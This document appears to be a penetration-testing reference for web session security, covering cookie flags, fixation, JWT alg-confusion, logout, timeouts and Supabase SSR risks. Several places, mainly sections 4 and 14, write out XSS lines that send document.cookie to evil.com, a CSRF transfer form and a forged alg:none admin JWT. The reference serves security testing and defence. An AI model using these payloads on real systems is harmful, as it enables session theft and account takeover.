# Session Management Security Reference

**Purpose:** Comprehensive reference for testing session management — cookie security, fixation, hijacking, JWT handling, logout, timeout, concurrent sessions, and Supabase SSR specifics.

**Schema version:** 1  
**Skill version:** paladin-probe@v3

---

## Table of Contents

1. [Session Lifecycle](#1-session-lifecycle)
2. [Cookie Security Flags](#2-cookie-security-flags)
3. [Session Fixation](#3-session-fixation)
4. [Session Hijacking](#4-session-hijacking)
5. [JWT Session Management](#5-jwt-session-management)
6. [Session Timeout](#6-session-timeout)
7. [Logout Functionality](#7-logout-functionality)
8. [Concurrent Session Handling](#8-concurrent-session-handling)
9. [Token Binding](#9-token-binding)
10. [Cookie Prefixes](#10-cookie-prefixes)
11. [Supabase SSR Session Management](#11-supabase-ssr-session-management)
12. [Session Puzzling](#12-session-puzzling)
13. [Testing Methodology](#13-testing-methodology)
14. [Payload Quick Reference](#14-payload-quick-reference)
15. [YAML Fingerprint Tables](#15-yaml-fingerprint-tables)

---

## 1. Session Lifecycle

### Lifecycle States

```
Creation ─► Pre-auth (anonymous session) ─► Authentication ─► Authenticated session
                                                                    │
                                                            ┌── Expiry (timeout)
                                                            ├── Logout (explicit)
                                                            ├── Revocation (admin/compromise)
                                                            └── Password change
```

### Critical Properties

| Property | Requirement | Test |
|----------|------------|------|
| Session ID randomness | ≥128-bit entropy, CSPRNG | Predictability test |
| Regeneration on auth | ID changes after login | Capture pre/post auth IDs |
| No ID in URL | ID only in cookie/header | Check `?session=...` in query |
| Transport security | Only over HTTPS | MITM proxy test |
| Server-side validation | ID validated on each request | Tamper with ID |
| Termination on logout | Server-side invalidation | Replay old token after logout |

---

## 2. Cookie Security Flags

### Flag Reference

| Flag | Purpose | Test |
|------|---------|------|
| `Secure` | Only over HTTPS | Force HTTP, check if cookie sent |
| `HttpOnly` | No JS access | `document.cookie` in console |
| `SameSite=Strict` | No cross-site sends | Follow cross-site link, check auth |
| `SameSite=Lax` | Top-level GET only | POST from external form |
| `SameSite=None` | Cross-site (requires Secure) | CSRF test |
| `Domain` | Cookie scope | Set broad domain, check subdomain |
| `Path` | Path scope | Set `/admin`, access from `/public` |
| `Max-Age` / `Expires` | Lifetime | Tamper with expiry |

### Detection

```bash
# Inspect Set-Cookie header
curl -s -D- https://target.com/login -d '...' | grep -i set-cookie

# Check for missing Secure flag
curl -s -D- http://target.com/login -d '...' | grep -i set-cookie

# Test HttpOnly via XSS
# Inject: <script>alert(document.cookie)</script>
# If cookie not shown -> HttpOnly present
```

### Common Misconfigurations

- `Secure` missing on login cookie
- `HttpOnly` missing (XSS can steal token)
- `SameSite` not set (defaults: Lax in modern browsers, None in old)
- `Domain` set too broad (`.example.com` instead of `app.example.com`)
- `Path` set to `/` instead of `/api`
- `Max-Age` too long (years instead of hours)

---

## 3. Session Fixation

### Attack Pattern

1. Attacker obtains a valid session ID from the target app (pre-auth)
2. Attacker tricks victim into using that session ID (URL param, cookie injection)
3. Victim authenticates — server does NOT regenerate the session ID
4. Attacker reuses the known session ID to hijack the authenticated session

### Testing

```bash
# Step 1: Get a session ID before auth
curl -c /tmp/cookies1.txt http://target.com/ | grep session

# Step 2: Login with that same cookie
curl -b /tmp/cookies1.txt -c /tmp/cookies1.txt -X POST \
  -d 'user=test&pass=test' http://target.com/login

# Step 3: Compare session IDs
grep session /tmp/cookies1.txt
# If same -> fixation exists
```

### Detection Signals

- Session cookie value unchanged before and after login
- Same cookie accepted on multiple browsers/computers after auth
- URL-based session ID propagation persists through login

### Prevention

- Regenerate session ID on every authentication event
- Regenerate on privilege escalation
- Regenerate on password change
- Regenerate on MFA completion

---

## 4. Session Hijacking

### Attack Vectors

| Vector | Mechanism | Defense |
|--------|-----------|---------|
| XSS theft | JS reads `document.cookie` | HttpOnly flag |
| MITM | Intercept HTTP traffic | Secure flag, HSTS |
| Network sniffing | WiFi/corporate network | Secure flag, TLS |
| Session prediction | Weak PRNG | CSPRNG, ≥128-bit |
| Side channel | Timing, cache | Constant-time comparison |
| Physical access | Browser dev tools | Screen lock, session timeout |

### Cookie Jar Overflow

Even with HttpOnly, attackers who have JS execution can:
1. Flood cookie jar with attacker-controlled cookies (name collision)
2. Force eviction of the HttpOnly cookie (browser cookie limit per domain ~180)
3. Set a new cookie with the same name and an attacker-chosen value

### Testing

```bash
# Test cookie theft via XSS
# Inject on page that reflects into response:
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

# Test MITM -> force HTTP
curl -s -D- http://target.com/login -X POST -d 'user=test&pass=test'
# If Set-Cookie without Secure -> vulnerable
```

---

## 5. JWT Session Management

### Storage Locations & Risks

| Location | XSS risk | CSRF risk | Server access | Recommendation |
|----------|----------|-----------|---------------|----------------|
| localStorage | Full (JS readable) | None | None | Avoid for sensitive apps |
| sessionStorage | Full (JS readable) | None | None | Only for short-lived sessions |
| Cookie (HttpOnly) | Protected | Yes (if no SameSite) | Yes (SSR) | Best for SSR apps |
| Cookie (HttpOnly + SameSite) | Protected | Protected | Yes (SSR) | **Preferred** |
| Memory (variable) | Protected (no persist) | None | No | Secure but no persistence |

### JWT-Specific Issues

| Issue | Test |
|-------|------|
| Alg confusion (`alg: none`, RS->HS) | Tamper JWT header |
| Weak secret | Crack with hashcat |
| No expiry (`exp`) | Use expired token |
| No `nbf` check | Use future-dated token |
| Expired refresh token | Replay old refresh |
| Refresh token not rotated | Replay refresh multiple times |
| JWT in URL | Check for `?token=` in logs |
| JWT in Referer header | Check Referer when navigating |

### JWT Alg Confusion Payloads

```json
// none algorithm
{"alg":"none","typ":"JWT"}
// -> header.eyJzdWIiOiIxMjM0NTY3ODkwIn0.

// RS256 -> HS256 (when public key is known)
// Sign as HMAC using the public key as the secret
{"alg":"HS256","typ":"JWT"}
```

### Token Rotation

- Access token: short-lived (15 min – 1 hour)
- Refresh token: longer-lived (7–30 days), single-use
- Rotation: each refresh invalidates the previous refresh token
- Denylist: revoked tokens checked server-side

---

## 6. Session Timeout

### Types

| Type | Description | Test |
|------|-------------|------|
| Idle timeout | No activity for N minutes | Wait, then make request |
| Absolute timeout | Max session lifespan | Wait for hard limit |
| Rolling refresh | Reset idle on activity | Interact and verify |
| Per-role timeout | Admins shorter timeout | Auth as admin, wait |

### Testing

```bash
# Test idle timeout
# 1. Authenticate and capture token
# 2. Wait N minutes
# 3. Replay token -> expect 401

# Test absolute timeout
# 1. Note session creation time
# 2. Wait past hard limit
# 3. Replay -> expect 401
```

### Common Issues

- No idle timeout on mobile/SPA tokens
- Absolute timeout set to months or "never"
- Timeout only on client side (JS timer, no server enforcement)
- Cookie `Max-Age` set but server never checks
- Session survives browser close (persistent cookie with long expiry)

---

## 7. Logout Functionality

### Complete Logout Checklist

- [ ] Server-side session destroyed (not just cookie deletion)
- [ ] Token invalidated immediately (not lazy expiry)
- [ ] All active sessions terminated (or option to)
- [ ] Back/forward buttons don't restore session
- [ ] Browser cache doesn't preserve authenticated pages
- [ ] Logout from all devices option works
- [ ] Token denylist checked on every request
- [ ] Refresh token revoked alongside access token

### Testing

```bash
# Test server-side invalidation
# 1. Login, capture token
# 2. Logout
# 3. Replay token -> expect 401

# Test back-button after logout
# 1. Login, visit dashboard
# 2. Logout
# 3. Click browser back -> should NOT show dashboard

# Test token still valid after "logout"
curl -H "Authorization: Bearer $TOKEN" http://target.com/api/protected
# If 200 -> logout did not invalidate
```

### Common Failures

- Logout only removes client cookie, server session remains active
- JWT continues to work until natural expiry
- `Cache-Control: no-store` missing on authenticated pages
- SSO logout does not propagate to all services
- No CSRF protection on logout endpoint

---

## 8. Concurrent Session Handling

### Patterns

| Pattern | Description | Security Implication |
|---------|-------------|---------------------|
| Unlimited | No limit on concurrent sessions | Credential sharing, slower breach detection |
| Limited | N max concurrent sessions | Attacker may be locked out |
| Single-session | Only one active session | Session conflict, usability issue |
| Force-terminate | New login kills old sessions | Good for password reset, bad for shared devices |
| Device tracking | Named sessions per device | Detect unknown devices |

### Testing

```bash
# Login from two different browsers
# Browser A -> capture token
# Browser B -> capture token
# Use both tokens simultaneously -> both should work OR config applies

# Force-terminate test
# Login on browser A
# Login on browser B
# Request with token A -> expect valid or invalid based on policy
```

---

## 9. Token Binding

### Approaches

| Approach | Strength | Implementation |
|----------|----------|----------------|
| IP binding | Low (NAT, VPN, mobile) | Store IP in session, validate per request |
| User-Agent binding | Medium | Store User-Agent in session |
| TLS session binding | High | Use TLS client certificate |
| Token Binding protocol | High | OAuth 2.0 Token Binding (RFC 8471) |

### Testing

```bash
# Test IP binding
# 1. Login from 1.2.3.4
# 2. Replay token from 5.6.7.8
# 3. Expect 401 if binding enforced

# Test User-Agent binding
# 1. Login with Chrome
# 2. Replay token with curl (no UA / different UA)
# 3. Expect 401 if binding enforced
```

---

## 10. Cookie Prefixes

### Prefix Reference

| Prefix | Requirement | Enforcement |
|--------|-------------|-------------|
| `__Secure-` | Must have `Secure` flag | Browser rejects if missing |
| `__Host-` | Must have `Secure`, `Path=/`, no `Domain` | Browser rejects if wrong |

### Testing

```bash
# Check if app uses cookie prefixes
curl -s -D- https://target.com/login -d '...' | grep -i 'Set-Cookie.*__Host-\|Set-Cookie.*__Secure-'
```

### Benefit

Prevents cookie name collision attacks where a subdomain sets a cookie with the same name as the main domain's session cookie. With `__Host-`, the cookie is scoped to the exact origin.

---

## 11. Supabase SSR Session Management

### Architecture

```
Browser ───► Next.js Middleware ───► Supabase Auth (GoTrue)
                 │
            ┌────┴────┐
            │         │
       Server     Client
      Components  Components
```

### Key Components

| Component | Role |
|-----------|------|
| `@supabase/ssr` | Cookie-based session lifecycle in SSR |
| Next.js Middleware | Refresh-token rotation on every request |
| `getUser()` vs `getSession()` | `getUser()` validates with server; `getSession()` reads cookie without validation |
| PKCE flow | Default in `@supabase/ssr` — prevents auth code interception |

### Known Risks

| Risk | Description | Mitigation |
|------|-------------|------------|
| Cookie merge race | `mergeSupabaseCookies` race condition | Atomic cookie operations |
| RedirectTo validation | OAuth callback redirectTo parameter can be hijacked | Validate redirectTo against allowlist |
| ISR cache poisoning | Cached page includes stale `Set-Cookie` | `force-dynamic` on auth routes |
| CDN cookie leak | CDN caches `Set-Cookie` header | Bypass CDN for auth responses |
| `getSession()` forgery | Reads cookie without server validation | Always use `getUser()` for auth decisions |
| Cookie chunk corruption | Large sessions split into chunks; corruption leads to parse errors | `@supabase/ssr` v0.8+ fixes chunk handling |
| `cookie` package vuln | `@supabase/ssr` <0.7.0 depends on `cookie` <0.7.0 (GHSA-pxg6-pf52-xh8x) | Upgrade to `@supabase/ssr` >=0.8.0 |

### Testing Supabase SSR

```bash
# Test getSession() vs getUser() discrepancy
# 1. Tamper access_token cookie value
curl -b 'sb-access-token=FAKE' https://target.com/api/protected

# 2. Compare results of getSession() (honors tampered cookie) vs getUser() (rejects)

# Test middleware cookie write
# Inspect response headers for Set-Cookie on every request
curl -s -D- https://target.com/dashboard | grep -i 'set-cookie'

# Test ISR cache poison
# 1. Request /profile as user A -> cached
# 2. Request /profile as user B -> should get own data, not A's
```

---

## 12. Session Puzzling

### Attack Pattern

Session puzzling (aka session variable overwriting) exploits shared session storage across different application modules. An attacker sets a session variable through one module, then leverages it in another module with different security assumptions.

### Testing

1. Map all session variables
2. Identify which module sets each variable
3. Cross-reference: can a low-privilege module set a variable used by a high-privilege module?
4. Check if session variables persist after privilege level changes

```bash
# Example: pricing page sets session.is_admin = false
# Admin panel checks session.is_admin (no type check)
# Can we set is_admin via another endpoint?
```

---

## 13. Testing Methodology

### Phase 1: Map the Session

1. Identify token location (cookie / localStorage / URL / header)
2. Determine session ID format (opaque token / JWT / encrypted value)
3. Map when token is issued (first visit / pre-auth / post-auth)
4. Map when token changes (login / role change / MFA / password change / logout)
5. Determine validation mechanism (Bearer / server-side table / hybrid)

### Phase 2: Probe Boundaries

| Test | Command / Technique |
|------|-------------------|
| Missing Secure | Force HTTP, capture cookie |
| Missing HttpOnly | `document.cookie` via XSS probe |
| Missing SameSite | CSRF via external form |
| Fixation | Compare pre/post auth IDs |
| IDOR via token | Tamper JWT payload / session ID |
| Expired token | Replay old token |
| Revoked token | Logout, replay |
| Concurrent limit | Login from N sessions |
| Timeout | Wait, make request |
| Back-button | Navigate after logout |

### Phase 3: Advanced

| Test | Technique |
|------|-----------|
| Alg confusion | Modify JWT header to `none` or `HS256` |
| Weak JWT secret | Crack with hashcat (`jwt_tool`, `jwt-cracker`) |
| Cookie jar overflow | Set 200+ cookies via JS |
| Token in Referer | Navigate from HTTPS to HTTP, check Referer |
| Token in logs | Check server logs/error pages |
| Session puzzling | Cross-module variable overwrite |
| WebSocket hijack | Cross-origin WebSocket connection |

---

## 14. Payload Quick Reference

```bash
# Capture Set-Cookie
curl -s -D- https://target.com/login -d 'user=test&pass=test' 2>&1 | grep -i set-cookie

# Test Secure flag (force HTTP)
curl -s -D- http://target.com/login -d 'user=test&pass=test' 2>&1 | grep -i set-cookie

# Test HttpOnly (via reflected XSS)
# Submit: <script>new Image().src='https://evil.com/log?c='+document.cookie</script>

# Test SameSite (CSRF via form)
# Host form on evil.com:
# <form action="https://target.com/transfer" method="POST">
#   <input name="amount" value="1000">
#   <input name="to" value="attacker">
# </form>

# Test session fixation
curl -c /tmp/preauth.txt https://target.com/
# Note session ID in preauth.txt
curl -b /tmp/preauth.txt -c /tmp/preauth.txt -X POST \
  -d 'user=test&pass=test' https://target.com/login
# Compare session ID in preauth.txt before and after

# Test logout invalidation
TOKEN=$(curl -s -D- https://target.com/login -d 'user=test&pass=test' | grep session | cut -d= -f2)
curl -b "session=$TOKEN" https://target.com/logout
curl -b "session=$TOKEN" https://target.com/api/protected
# Expect 401

# Test JWT none alg
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"1","role":"admin","iat":...}
# Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.

# Test Supabase SSR getSession() forgery
curl -b 'sb-access-token=FAKE_JWT' https://target.com/api/protected

# Test token binding (IP)
# Login from proxy A, replay token from proxy B

# Test idle timeout
# Login, wait 30 min, make authenticated request

# Test concurrent session limit
# Login N+1 times, check which sessions remain valid
```

---

## 15. YAML Fingerprint Tables

```yaml
session_cookie_no_secure:
  probe: 'force HTTP request to login'
  detection: Set-Cookie present without Secure flag

session_cookie_no_httponly:
  probe: 'document.cookie after XSS injection'
  detection: cookie value readable from JS

session_cookie_no_samesite:
  probe: 'inspect Set-Cookie on login response'
  detection: SameSite attribute absent

session_fixation:
  probe: 'compare pre-auth and post-auth session cookie values'
  detection: cookie value unchanged after authentication

session_no_server_logout:
  probe: 'replay token after calling logout endpoint'
  detection: 200 response (should be 401)

session_no_idle_timeout:
  probe: 'authenticate, wait 30+ min, replay token'
  detection: token still valid past reasonable idle limit

session_jwt_alg_none:
  probe: 'send JWT with alg: none header'
  detection: 200 response accepted

session_jwt_alg_hs256:
  probe: 'send JWT signed with HS256 using public key as secret'
  detection: 200 response (key confusion)

session_supabase_getSession:
  probe: 'send tampered sb-access-token cookie'
  detection: getSession() returns user object despite invalid JWT

session_cookie_prefix_missing:
  probe: 'inspect Set-Cookie for __Host- or __Secure- prefix'
  detection: session cookie lacks prefix

session_id_in_url:
  probe: 'check URLs for jsessionid, PHPSESSID, or similar in query'
  detection: session token visible in URL
```
